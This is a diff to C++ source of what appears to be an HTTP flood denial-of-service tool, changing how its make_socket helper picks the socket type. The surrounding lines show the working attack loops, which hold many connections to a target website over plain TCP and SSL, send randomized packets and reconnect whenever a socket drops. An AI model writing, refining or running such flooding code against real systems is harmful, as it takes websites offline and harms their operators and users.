@@ -25,14 +25,14 @@ void Http_Flood::run() {
 
 }
 
-int Http_Flood::make_socket(const char *host, const char *port) {
+int Http_Flood::make_socket(const char *host, const char *port, int sock_type) {
     struct addrinfo hints{}, *servinfo, *p;
     int sock = 0, r;
     std::string message = std::string("Connecting-> ") + host + ":" + port;
     logger->Log(&message, Logger::Info);
     bzero(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
-    hints.ai_socktype = conf->protocol == config::UDP ? SOCK_DGRAM: SOCK_STREAM;
+    hints.ai_socktype = sock_type;
     if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
         message = std::string("Getaddrinfo-> ") + gai_strerror(r);
         logger->Log(&message, Logger::Error);
@@ -133,12 +133,12 @@ void Http_Flood::attack(const int *id) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
             }
             const char *packet = Randomizer::randomPacket(conf);
             if((r = write_socket(sockets[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(&sockets[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
             }else{
                 if(conf->GetResponse){
                     read_socket(sockets[x]);
@@ -171,14 +171,14 @@ void Http_Flood::attack_ssl(const int *id) {
         static std::string message;
         for (int x = 0; x < conf->CONNECTIONS; x++) {
             if(!sockets[x]){
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }
             const char *packet = Randomizer::randomPacket(conf);
             if((r = write_socket(SSLs[x], packet, static_cast<int>(strlen(packet)))) == -1){
                 cleanup(SSLs[x], &sockets[x], CTXs[x]);
-                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str());
+                sockets[x] = make_socket(conf->website.c_str(), conf->port.c_str(), SOCK_STREAM);
                 CTXs[x] = InitCTX();
                 SSLs[x] = Apply_SSL(sockets[x], CTXs[x]);
             }else{
